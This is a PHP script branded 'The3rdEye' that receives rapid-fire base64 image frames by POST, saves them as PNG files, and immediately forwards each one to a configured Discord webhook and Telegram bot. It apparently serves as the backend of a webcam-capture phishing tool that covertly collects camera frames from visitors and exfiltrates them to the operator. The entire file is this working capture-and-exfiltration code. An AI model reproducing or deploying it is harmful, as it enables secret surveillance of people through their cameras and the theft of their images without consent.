<?php
// The3rdEye v1.0 - Rapid Image Capture (0.1s interval capable)
// Saves frames and immediately pings webhooks

$CONFIG_FILE = $_SERVER['HOME'] . '/.the3rdeye/config.ini';
$DISCORD_WEBHOOK = '';
$TELEGRAM_BOT_TOKEN = '';
$TELEGRAM_CHAT_ID = '';

if (file_exists($CONFIG_FILE)) {
    $config = parse_ini_file($CONFIG_FILE);
    $DISCORD_WEBHOOK = isset($config['DISCORD_WEBHOOK']) ? $config['DISCORD_WEBHOOK'] : '';
    $TELEGRAM_BOT_TOKEN = isset($config['TELEGRAM_BOT_TOKEN']) ? $config['TELEGRAM_BOT_TOKEN'] : '';
    $TELEGRAM_CHAT_ID = isset($config['TELEGRAM_CHAT_ID']) ? $config['TELEGRAM_CHAT_ID'] : '';
}

function sendImageToDiscord($filePath, $webhook) {
    if (empty($webhook) || !file_exists($filePath)) return false;
    $ch = curl_init($webhook);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, [
        'content' => '@everyone [The3rdEye] New frame captured!',
        'file' => new CURLFile($filePath)
    ]);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_exec($ch);
    curl_close($ch);
}

function sendImageToTelegram($filePath, $botToken, $chatId) {
    if (empty($botToken) || empty($chatId) || !file_exists($filePath)) return false;
    $url = "https://api.telegram.org/bot{$botToken}/sendPhoto";
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, [
        'chat_id' => $chatId,
        'photo' => new CURLFile($filePath)
    ]);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_exec($ch);
    curl_close($ch);
}

$date = date('dMYHis') . substr(microtime(), 1, 4) * 10000; // High-precision timestamp for 0.1s captures
$imageData = $_POST['cat'] ?? '';

if (!empty($imageData)) {
    error_log("Frame captured at " . date('Y-m-d H:i:s.v') . "\r\n", 3, "Log.log");
    
    $filteredData = substr($imageData, strpos($imageData, ",") + 1);
    $unencodedData = base64_decode($filteredData);
    $filename = 'captured_' . $date . '.png';
    $fp = fopen($filename, 'wb');
    fwrite($fp, $unencodedData);
    fclose($fp);
    
    // Immediate webhook push
    if (!empty($DISCORD_WEBHOOK)) sendImageToDiscord($filename, $DISCORD_WEBHOOK);
    if (!empty($TELEGRAM_BOT_TOKEN) && !empty($TELEGRAM_CHAT_ID)) sendImageToTelegram($filename, $TELEGRAM_BOT_TOKEN, $TELEGRAM_CHAT_ID);
}
exit();
?>